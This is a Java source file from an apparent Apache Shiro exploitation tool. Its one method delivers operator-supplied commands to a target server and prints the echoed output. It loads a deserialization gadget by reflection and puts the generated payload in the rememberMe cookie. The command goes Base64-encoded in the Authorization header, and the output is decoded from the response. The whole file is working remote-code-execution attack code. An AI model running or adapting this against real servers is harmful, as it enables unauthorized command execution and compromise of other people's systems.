package com.y5neko.shiroexp.payloads;

import com.y5neko.shiroexp.misc.Tools;
import com.y5neko.shiroexp.request.HttpRequest;
import com.y5neko.shiroexp.request.ResponseOBJ;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class CommandExcute {
    /**
     * 命令执行回显
     * @param targetOBJ 请求对象
     * @param command 执行命令
     */
    public static void commandExcute(TargetOBJ targetOBJ, String command) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        try {
            // 获取payload
            Class<?> gadgetClass = Class.forName("com.y5neko.shiroexp.gadget." + targetOBJ.getGadget());
            Method method = gadgetClass.getDeclaredMethod("genEchoPayload", String.class);
            String payload = (String) method.invoke(null, targetOBJ.getEcho());

            // 生成命令
            command = Base64.getEncoder().encodeToString(command.getBytes());
            Map<String, String> headers = new HashMap<>();
            headers.put("Cookie", targetOBJ.getRememberMeFlag() + "=" + payload);
            headers.put("Authorization", "Basic " + command);

            ResponseOBJ responseOBJ = HttpRequest.httpRequest(targetOBJ, null, headers, "GET");
            String result = Tools.bytesToString(Base64.getDecoder().decode(Tools.extractStrings(Tools.bytesToString(responseOBJ.getResponse()))));
            System.out.println("[" + Tools.color("SUCC", "GREEN") + "] 命令执行成功");
            System.out.println("----------");
            System.out.println(result);
            System.out.println("----------");
        } catch (Exception e) {
            System.out.println("[" + Tools.color("EROR", "RED") + "] " + e.getMessage());
        }
    }
}
